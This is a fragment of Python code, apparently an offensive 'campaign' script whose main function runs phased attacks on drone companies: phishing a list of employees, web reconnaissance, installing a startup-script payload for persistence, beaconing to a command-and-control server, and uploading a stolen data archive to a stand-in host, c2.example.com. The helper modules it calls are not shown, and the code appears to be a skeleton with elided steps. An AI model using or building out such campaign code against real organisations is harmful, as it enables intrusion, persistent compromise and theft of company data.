...
def main():
    """
    Main function to run the drone_company_campaign campaign.
    """
    print(f"[*] Starting drone_company_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("drone_companies_employees.txt")
    run_tool("apt_web_recon.js", "--target drone_companies.com")


    # 2. Persistence
    print("\n[*] Phase 2: Persistence")
    persistence.add_startup_script("payloads/drone_technology_and_hijacking_drones_exfiltrator.py")
    ...
    command_control.send_beacon(c2_server, "VICTIM-DRONE_COMPANIES-01")
    ...
    exfiltration.exfiltrate_data("drone_technology_and_hijacking_drones/drone_technology_and_hijacking_drones.zip", "https://c2.example.com/upload")
    run_tool("payloads/drone_technology_and_hijacking_drones_exfiltrator.py")
